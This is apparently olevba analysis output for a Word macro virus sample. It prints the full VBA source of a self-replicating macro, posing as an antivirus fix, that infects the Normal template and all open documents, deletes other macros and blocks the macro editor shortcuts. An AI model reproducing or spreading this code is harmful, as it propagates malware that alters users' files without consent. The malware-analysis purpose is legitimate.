olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Opey.bc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Opey.bc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO HATE_LAWALATA.bas 
in file: ./Virus.MSWord.Opey.bc - OLE stream: 'Macros/VBA/HATE_LAWALATA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' ------------------------------------------------------------------------------------
' USER:         PAF Technical Specialization Training School
' AUTHOR:       MIGUEL C CAÑETE
' DATE CREATED: 08 August 00
' Note:         This macro was created to counter, if not eliminate the effects of the
'               LOVE and the LUMLAWALATA viruses.
' ------------------------------------------------------------------------------------

Private Sub Protect()
On Error Resume Next
    
    Dim DocuName$, OpenDocImmunized As Boolean
    Dim I%, J%, NmImmunized As Boolean
    
    NmImmunized = False
        
    For I = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1
        DocuName = NormalTemplate.VBProject.VBComponents(I).Name
        If DocuName = "HATE_LAWALATA" Then NmImmunized = True
        If (DocuName <> "HATE_LAWALATA") And _
            (DocuName <> "ThisDocument") Then
            Application.OrganizerDelete _
                Source:=NormalTemplate.FullName _
                , Name:=DocuName _
                , Object:=wdOrganizerObjectProjectItems
        End If
    Next I
    
    For Each opendoc In Documents
        OpenDocImmunized = False
        With opendoc
            For J = opendoc.VBProject.VBComponents.Count To 1 Step -1
                DocuName = opendoc.VBProject.VBComponents(J).Name
                If DocuName = "HATE_LAWALATA" Then OpenDocImmunized = True
                If (DocuName <> "HATE_LAWALATA") And _
                   (DocuName <> "ThisDocument") And _
                   (DocuName <> "Reference to Normal") Then
                     Application.OrganizerDelete Source:=opendoc.FullName _
                     , Name:=DocuName _
                     , Object:=wdOrganizerObjectProjectItems
                End If
            Next J
            
            If Not OpenDocImmunized Then
                Application.OrganizerCopy Source:=NormalTemplate.FullName, _
                Destination:=opendoc.FullName, _
                Name:="HATE_LAWALATA", _
                Object:=wdOrganizerObjectProjectItems
                opendoc.SaveAs FileName:=opendoc.FullName
            End If
        End With
    Next opendoc
    
    If Not NmImmunized Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, _
         Destination:=NormalTemplate.FullName, Name:="HATE_LAWALATA", _
         Object:=wdOrganizerObjectProjectItems
        NormalTemplate.Save
    End If
    
End Sub
Private Sub Defense()
On Error Resume Next
   
   Application.DisplayAlerts = wdAlertsAll
   WordBasic.DisableAutoMacros -1
   
    With Application
        .UserName = "PAF Technical Specialization Training School"
        .UserAddress = "Fernando Air Base, Lipa City"
        .UserInitials = "PAFTSTS"
    End With
    
    With Dialogs(wdDialogFileSummaryInfo)
        .Author = "MIGUEL C CAÑETE"
        .Keywords = "PAFFS 70-B"
        .Execute
    End With
    
    With Options
        .ConfirmConversions = True
        .VirusProtection = True
        .SaveNormalPrompt = True
    End With
    
    With ActiveDocument
        .ReadOnlyRecommended = False
    End With
    
   With CommandBars("Visual Basic")
      .Enabled = True
      .Protection = msoBarTypeMenuBar
      .Protection = msoBarMenuBar
   End With
   
   FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Clear
   FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Clear
   CustomizationContext = NormalTemplate

End Sub

Sub FileSave()
On Error Resume Next
    Call Defense
    Call Protect
    ActiveDocument.Save
End Sub

Sub FileClose()
On Error Resume Next
    Call Defense
    Call Protect
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub

Sub FileExit()
On Error Resume Next
    Call Defense
    Call Protect
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub

Sub FileNew()
On Error Resume Next
    Call Defense
    Call Protect
    Dialogs(wdDialogFileNew).Show
    Call Protect
End Sub

Sub AutoOpen()
On Error Resume Next
   Call Defense
   Call Protect
End Sub

Sub AutoExec()
Attribute AutoExec.VB_Description = "Macro created 10/08/00 by MIGUEL C CAÑETE"
Attribute AutoExec.VB_ProcData.VB_Invoke_Func = "TemplateProject.HATE_LAWALATA.AutoExec"
On Error Resume Next
    Call Defense
    Call Protect
End Sub

Sub FileSaveAs()
On Error Resume Next
    Call Defense
    Call Protect
    Dialogs(wdDialogFileSaveAs).Show
    Call Protect
End Sub

Sub FileOpen()
On Error Resume Next
    Call Defense
    Call Protect
    Dialogs(wdDialogFileOpen).Show
    Call Protect
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

